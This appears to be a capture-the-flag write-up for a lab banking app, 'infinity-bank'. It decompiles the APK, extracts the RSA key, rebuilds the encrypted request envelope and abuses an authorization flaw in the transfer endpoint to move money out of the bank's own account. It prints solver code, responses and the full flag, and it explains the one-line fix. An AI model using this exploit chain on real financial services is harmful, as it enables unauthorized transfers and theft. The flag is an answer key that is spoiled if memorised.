# CR7 — writeup

`INFODAYS{SaamNoLimits_broken_object_level_auth_<hex>}`

## TL;DR

1. Decompile the Flutter APK with [`blutter`](https://github.com/worawit/blutter).
2. Lift the RSA public key out of `libapp.so`.
3. Reimplement the RSA-OAEP + AES-CBC envelope.
4. Register → login → IDOR the `transaction/transfer` endpoint using
   `from_account = 93478541` (the bank's privileged account).
5. The server echoes the flag back in the transaction's `remark`.

## 1. APK recon

```
$ unzip infinity-bank.apk -d inf
$ ls inf/lib/arm64-v8a/
libapp.so libflutter.so librsa_bridge.so
```

`libapp.so` is a Dart AOT snapshot — `jadx` won't help. Use blutter:

```
$ git clone https://github.com/worawit/blutter
$ python3 blutter/blutter.py inf/lib/arm64-v8a/ out/
```

Inspect `out/asm/bank/`:

- `api_service.dart` — base URL, per-endpoint helpers
- `request.dart` / `response.dart` — DTOs
- `rsa.dart` — the custom RSA + AES envelope
- `transaction_complete_page.dart` — fields for transfer

And `out/pp.txt` (the Dart "object pool") dumps every hardcoded
string. Among them:

```
[pp+0xaa38] String: "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A..."
```

Copy the PEM out — or better, let the solver do it:

```python
pem_re = re.compile(rb"-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----", re.S)
pub = pem_re.search(zipfile.ZipFile(apk).read("lib/arm64-v8a/libapp.so")).group(0)
```

## 2. The envelope protocol

From `rsa.dart`, every call performs:

```
pt        = json.encode(body)
key, iv, salt = randomBytes(32), randomBytes(16), randomBytes(16)
ct        = aesCbc(pt, key, iv)
sig       = sha256(pt)

KEY       = base64(rsaOAEP_sha256(base64(key)))
IV        = base64(rsaOAEP_sha256(base64(iv)))
SALT      = base64(rsaOAEP_sha256(base64(salt)))
SIGNATURE = hex(sig)

POST /api/v1/<endpoint>
Headers:
  Host: infinity-bank.lab
  Content-Type: text/plain
  KEY, IV, SALT, SIGNATURE, (optional Authorization: Bearer <token>)
Body: base64(ct)

Response body is base64(aesCbc(json, key, iv))
```

Two quirks worth noting:

- Key / IV / salt are **base64'd before** RSA encryption.
- The outer layer of `KEY` / `IV` / `SALT` is also base64 of the RSA
  ciphertext.
- `SALT` is accepted but never actually consumed server-side — it
  exists only to make the protocol look denser than it is.

## 3. Fields that aren't guessable

Registration silently returns `{"errors": ["internal error"]}` if
**any** field is missing. `RegisterRequest.toJson()` in the blutter
output lists all of them:

```json
{
  "device_id":   "...",
  "email":       "...",
  "first_name":  "...",
  "middle_name": "",
  "last_name":   "...",
  "password":    "...",
  "username":    "..."
}
```

Login returns `{ "token": "...", "pin": "..." }`. The `pin` is just
flavour — not needed for any call.

`user/me` and `transaction/history` accept the session token **inside
the plaintext JSON body** as `{"token": "..."}` — passing it only as
a bearer header also works.

## 4. The IDOR

`TransferRequest.toJson()`:

```json
{
  "amount": 1337.0,
  "auth":   { "token": "<JWT-like opaque>" },
  "from_account": <sender account number>,
  "to_account":   <recipient account number>,
  "remark": "..."
}
```

The server verifies the token, looks the account up by number, and
moves money. It **never** verifies the token's user owns
`from_account`. Classic Broken Object Level Authorization.

Everyone gets `13.37` at registration — and that 13.37 was *sent from*
account `93478541`. That's the bank's privileged account. You don't
own it; the server doesn't care.

```python
send("transaction/transfer", {
    "amount": 1337.0,
    "auth": {"token": TOKEN},
    "from_account": 93478541,
    "to_account":   my_account,
    "remark": "flag please",
})
```

Response:

```json
{
  "txn_id": "PAPAROTKDTMDSNG",
  "from_account": 93478541,
  "to_account": 190691254,
  "amount": 1337.0,
  "remark": "INFODAYS{SaamNoLimits_broken_object_level_auth_...}",
  "date": "..."
}
```

(The lab backend only surfaces the flag in the remark when the transfer
actually moves `>= 1337.0` out of the bank account — smaller
authenticated-user-to-user transfers work as normal banking, which
keeps the app usable for red-herring exploration.)

## 5. Why the transport crypto doesn't matter

All that RSA-OAEP + AES-CBC + SHA-256-signature noise guarantees is
confidentiality + integrity of the wire. It says nothing about whether
the authenticated user is allowed to move money out of a specific
account. Authentication is not authorization.

If the server had a single line like

```python
if src["owner"] != user["email"]:
    return _respond({"errors": ["forbidden"]}, key, iv, 403)
```

…the whole chain would collapse to "can only drain your own account."
Security by obscurity (a hand-rolled crypto envelope) is not security.

## Running the solver

```
$ python3 solver/solve.py 127.0.0.1:8080
[+] pub key from APK: -----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A... (450 bytes)
[+] registering pwnxyzk@lab.local
[+] logging in
[+] my account: 190691254 (balance 13.37)
[+] IDOR: transfer 1337.0 from bank (93478541) -> 190691254
FLAG: INFODAYS{SaamNoLimits_broken_object_level_auth_1d58caf2}
```
